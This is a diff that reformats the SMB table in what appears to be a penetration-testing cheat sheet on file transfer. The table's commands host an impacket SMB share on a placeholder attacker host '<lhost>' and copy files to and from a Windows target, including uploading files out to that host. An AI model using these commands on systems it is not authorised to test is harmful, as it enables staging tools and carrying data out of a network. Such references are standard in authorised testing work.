@@ -25,11 +25,11 @@
 ---
 ## SMB
 
-|Operation|Command|Platform|
-|---|---|---|
-|Host|`impacket-smbserver -ip <lhost> -smb2support -username <user> -password <password> <share> <path>`|Linux|
-|Download|`copy \\<lhost>\<share>\<file> C:\Temp\<file>`|Windows|
-|Upload|`copy C:\Temp\<file> \\<lhost>\<share>\<file>`|Windows|
+| Operation | Command                                                                                            | Platform |
+| --------- | -------------------------------------------------------------------------------------------------- | -------- |
+| Host      | `impacket-smbserver -ip <lhost> -smb2support -username <user> -password <password> <share> <path>` | Linux    |
+| Download  | `copy \\<lhost>\<share>\<file> C:\Temp\<file>`                                                     | Windows  |
+| Upload    | `copy C:\Temp\<file> \\<lhost>\<share>\<file>`                                                     | Windows  |
 
 ---
 ## Base64
